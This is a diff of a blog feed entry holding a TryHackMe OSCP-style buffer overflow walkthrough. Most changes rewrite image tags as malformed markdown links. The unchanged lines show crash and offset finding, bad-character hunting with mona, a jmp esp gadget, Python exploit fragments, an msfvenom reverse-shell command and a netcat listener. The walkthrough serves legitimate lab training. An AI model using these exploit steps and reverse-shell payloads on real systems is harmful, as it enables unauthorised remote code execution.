@@ -134,18 +134,18 @@ credentials are given in the TryHackme page):
 one used in the OSCP exam. It also comes with a plugin named Mona, which helps the
 exploitation a bit.</p>
 <p>In the debugger, we open the vulnerable binary and run it. This is what it looks like:
-<img src="oscp-bof-img/immunity.png" alt="Immunity Debugger" title="Immunity Debugger"></p>
+<img src="/posts/oscp-bof-img/immunity.png" alt="Immunity Debugger" title="Immunity Debugger"></p>
 <p>According to TryHackme instructions, the binary listens to port 1337. Let&rsquo;s see:
-<img src="oscp-bof-img/bin0.png" alt="Connecting to binary" title="Connecting to binary">
+![Connecting to binary]/posts/oscp-bof-img/bin0.png &ldquo;Connecting to binary&rdquo;)
 Ok. We try its game and enter HELP:
-<img src="oscp-bof-img/bin1.png" alt="Connecting to binary" title="Connecting to binary">
+![Connecting to binary]/posts/oscp-bof-img/bin1.png &ldquo;Connecting to binary&rdquo;)
 Let&rsquo;s see this OVERFLOW1:
-<img src="oscp-bof-img/bin2.png" alt="Connecting to binary" title="Connecting to binary">
+![Connecting to binary]/posts/oscp-bof-img/bin2.png &ldquo;Connecting to binary&rdquo;)
 Right. Since it is a known fact that this binary is vulnerable to buffer overflow,
 one may try and trigger the overflow to cause a crash:
-<img src="oscp-bof-img/bin3.png" alt="Connecting to binary" title="Connecting to binary">
+![Connecting to binary]/posts/oscp-bof-img/bin3.png &ldquo;Connecting to binary&rdquo;)
 On the debugger we may see that the program crashed and some interesting stuff:
-<img src="oscp-bof-img/bin4.png" alt="Connecting to binary" title="Connecting to binary">
+![Connecting to binary]/posts/oscp-bof-img/bin4.png &ldquo;Connecting to binary&rdquo;)
 The stack pointer (ESP) points to a lot of As, exactly as we sent it. The
 instruction pointer (EIP) value is 0x41414141, which is AAAA in hex. This
 means we also control it somewhere along the buffer we sent.</p>
@@ -154,16 +154,16 @@ means we also control it somewhere along the buffer we sent.</p>
 Both come in Kali Linux and may be found in the directory <code>/usr/share/metasploit-framework/tools/exploit/</code>.
 The former will create a string forming a pattern and the latter will read 4 bytes
 of that pattern and tell the offset. First, we generate the string:
-<img src="oscp-bof-img/pattern_create.png" alt="Pattern Create" title="Pattern create"></p>
+![Pattern Create]/posts/oscp-bof-img/pattern_create.png &ldquo;Pattern create&rdquo;)</p>
 <p>Then we send it:
-<img src="oscp-bof-img/pattern_crash.png" alt="Pattern Create" title="Pattern create"></p>
-<p><img src="oscp-bof-img/pattern_crash1.png" alt="Pattern Create" title="Pattern create"></p>
+![Pattern Create]/posts/oscp-bof-img/pattern_crash.png &ldquo;Pattern create&rdquo;)</p>
+<p>![Pattern Create]/posts/oscp-bof-img/pattern_crash1.png &ldquo;Pattern create&rdquo;)</p>
 <p>As it may be observed, the ESP starts with 0Co1 and the value of
 EIP is <code>0x6f43396e</code>. If we convert the EIP value to ASCII and account
 for the endianess, this is what we get:</p>
-<p><img src="oscp-bof-img/convertion.png" alt="Pattern Create" title="Pattern create"></p>
+<p>![Pattern Create]/posts/oscp-bof-img/convertion.png &ldquo;Pattern create&rdquo;)</p>
 <p>Then <code>pattern_offset</code> can be used to retrieve the offsets of EIP and ESP:</p>
-<p><img src="oscp-bof-img/offsets.png" alt="Pattern Create" title="Pattern create"></p>
+<p>![Pattern Create]/posts/oscp-bof-img/offsets.png &ldquo;Pattern create&rdquo;)</p>
 <p>Finally, we do a python proof of concept which will connect to the vulnerable
 server and send a payload which will not only crash, but confirm that our offsets
 are reliable. The payload we&rsquo;ll send is:
@@ -190,7 +190,7 @@ s.recv(1024)
 s.close()
 
 </code></pre><p>And BOOM:</p>
-<p><img src="oscp-bof-img/boom.png" alt="Boom" title="Boom!"></p>
+<p>![Boom]/posts/oscp-bof-img/boom.png &ldquo;Boom!&quot;)</p>
 <p>Exactly as we predicted. Now we may hijack the execution flow. But first,
 we need to worry about badchards!</p>
 <h3 id="badchars">Badchars</h3>
@@ -235,20 +235,20 @@ ESP points).</p>
 <p>Before the script is ran, mona requires some setup. First, we set its
 working folder:
 <code>!mona config -set workingfolder c:\mona\%p</code></p>
-<p><img src="oscp-bof-img/mona-config0.png" alt="Mona config" title="Mona config"></p>
+<p>![Mona config]/posts/oscp-bof-img/mona-config0.png &ldquo;Mona config&rdquo;)</p>
 <p>Now we tell mona to create a bytearray. It will create a byte array from byte 0 to 255,
 except for the ones we tell it to ignore (byte &ldquo;\x00&rdquo;, in this case):</p>
 <p><code>!mona bytearray -b &quot;\x00&quot;</code></p>
-<p><img src="oscp-bof-img/mona-bytearray.png" alt="Mona config" title="Mona config">
+<p>![Mona config]/posts/oscp-bof-img/mona-bytearray.png &ldquo;Mona config&rdquo;)
 Note that the output is saved to <code>bytearray.bin</code>.</p>
 <p>Finally, we run the script and ask mona to compare the bytes we sent to the bytes in memory:</p>
 <p><code>!mona compare -f C:\mona\oscp\bytearray.bin -a esp</code></p>
-<p><img src="oscp-bof-img/badchars.png" alt="Badchars" title="Bad chars"></p>
+<p>![Badchars]/posts/oscp-bof-img/badchars.png &ldquo;Bad chars&rdquo;)</p>
 <p>Note that there are several consecutive badchars. It is not uncommon that one badchar will
 mess with the next char, even if it is legit. One way to get the actual badchars is to repeat
 the process several times, eliminating at each iteraction the first badchar that is not yet
 ignored. We remove then <code>\x07</code> from the bytearrays and try again:</p>
-<p><img src="oscp-bof-img/badchars2.png" alt="Badchars" title="Bad chars"></p>
+<p>![Badchars]/posts/oscp-bof-img/badchars2.png &ldquo;Bad chars&rdquo;)</p>
 <pre><code>import socket
 
 ip = &quot;10.10.116.211&quot;
@@ -275,7 +275,7 @@ s.recv(1024)
 s.close()
 
 </code></pre><p>And we find out that <code>\x08</code> isn&rsquo;t a badchar after all:</p>
-<p><img src="oscp-bof-img/badchars3.png" alt="Badchars" title="Bad chars"></p>
+<p>![Badchars]/posts/oscp-bof-img/badchars3.png &ldquo;Bad chars&rdquo;)</p>
 <p>After this process is iterated until the last badchar, we find out that the badchars
 are actually <code>\x00\x07\x2e\xa0</code>.</p>
 <h2 id="generating-a-shellcode-to-get-rce">Generating a shellcode to get RCE</h2>
@@ -285,14 +285,14 @@ code it in C and compile, code it in assembly, or take advantage of the work of 
 which made msfvenom possible:</p>
 <p><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;your_ip_address&gt; LPORT=1234 EXITFUNC=thread -b &quot;\x00\x07\x2e\xa0&quot; -f python</code></p>
 <p>Where <code>LHOST</code> is your ip address, <code>LPORT</code> a local port of your preference, <code>EXITFUNC=thread</code> indicates that it will spawn a new thread for this reverse shell (for stability!!!), <code>b</code> precedes the badchars and <code>-f python</code> indicates that the shellcode output should be in python. This is the result:</p>
-<p><img src="oscp-bof-img/msfvenom.png" alt="msfvenom" title="msfvenom"></p>
+<p>![msfvenom]/posts/oscp-bof-img/msfvenom.png &ldquo;msfvenom&rdquo;)</p>
 <h2 id="triggering-the-shellcode">Triggering the shellcode</h2>
 <p>We have a payload. We can put the payload in the right place of the stack. Now
 we need to trigger this shellcode. One way to do this is the forementioned <code>jmp esp</code>
 approach. Once again we use mona. This time to find a <code>jmp esp</code> gadget which will placed
 in EIP to trigger the shellcode.</p>
 <p><code>!mona jmp -r esp -cpb &quot;\x00\x07\x2e\xa0&quot;</code></p>
-<p><img src="oscp-bof-img/gadget.png" alt="Gadgets" title="Gadgets"></p>
+<p>![Gadgets]/posts/oscp-bof-img/gadget.png &ldquo;Gadgets&rdquo;)</p>
 <p>Mona found a few executable addresses with the <code>jmp esp</code> instruction and ASLR disabled.
 I chose 0x620511af for my exploit.</p>
 <h2 id="pwning">pwning</h2>
@@ -352,7 +352,7 @@ shellcode. It won&rsquo;t interfere with the payload. When a NOP gets executed, 
 <p>This is importante because the payload is directly in the memory address to which <code>ESP</code> points,
 so a simple push or pop operation could corrupt the shellcode.</p>
 <p>We listen with netcat <code>nc -nvlp 1234</code> and run the exploit. The result is absolute success:</p>
-<p><img src="oscp-bof-img/pwned.png" alt="Pwned" title="Pwned"></p>
+<p>![Pwned]/posts/oscp-bof-img/pwned.png &ldquo;Pwned&rdquo;)</p>
 <h2 id="conclusion">Conclusion</h2>
 <p>In this post we exploited an OSCP-like buffer overflow challenge from TryHackMe. I hope
 it makes clear how to exploit this class of memory corruption vulnerability. The most
@@ -371,7 +371,6 @@ as forgetting to append NOPs before the shellcode, wrong badchars, forget to con
 when generating the msfvenom payload, account for endianess or using the correct payload.</li>
 </ul>
 <p>Finally, the secret is practice, practice, practice.</p>
-<p><code>The more I see the less I know</code></p>
 ]]></content>
 		</item>
 		
